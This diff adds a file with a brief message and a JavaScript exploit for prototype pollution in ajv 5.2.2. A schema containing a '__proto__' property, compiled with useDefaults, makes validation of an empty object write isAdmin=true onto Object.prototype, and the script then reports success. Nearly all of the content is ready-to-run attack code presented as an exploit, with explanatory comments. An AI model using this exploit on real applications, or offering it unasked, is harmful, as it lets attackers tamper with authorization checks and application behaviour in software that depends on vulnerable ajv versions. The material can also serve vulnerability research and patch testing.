@@ -1,0 +1,45 @@
+Works even without disabling schema validation. Here's the exploit:
+
+```javascript
+// Prototype Pollution in ajv 5.2.2 (CVE-2020-15366-style) via the "useDefaults"
+// option combined with a "__proto__" property name in the schema.
+//
+// When ajv compiles a schema whose "properties" map contains a key literally
+// named "__proto__", the generated validator code does `data.__proto__`
+// (instead of a safe own-property access). If the input object being
+// validated does not itself define an own "__proto__" property, this
+// expression resolves to the real Object.prototype. ajv then happily writes
+// the schema's default value onto it, polluting every object in the process.
+
+const Ajv = require("ajv");
+
+const ajv = new Ajv({ useDefaults: true });
+
+const maliciousSchema = {
+  type: "object",
+  properties: {
+    __proto__: {
+      type: "object",
+      properties: {
+        isAdmin: { type: "boolean", default: true }
+      }
+    }
+  }
+};
+
+const validate = ajv.compile(maliciousSchema);
+
+console.log("Before attack, ({}).isAdmin =", ({}).isAdmin);
+
+// Validating an ordinary, empty (attacker-supplied) object is enough to
+// trigger the pollution — no "__proto__" key needs to appear in the data.
+validate({});
+
+console.log("After attack,  ({}).isAdmin =", ({}).isAdmin);
+
+if (({}).isAdmin === true) {
+  console.log("EXPLOIT SUCCESSFUL: Object.prototype has been polluted!");
+} else {
+  console.log("Exploit failed.");
+}
+```
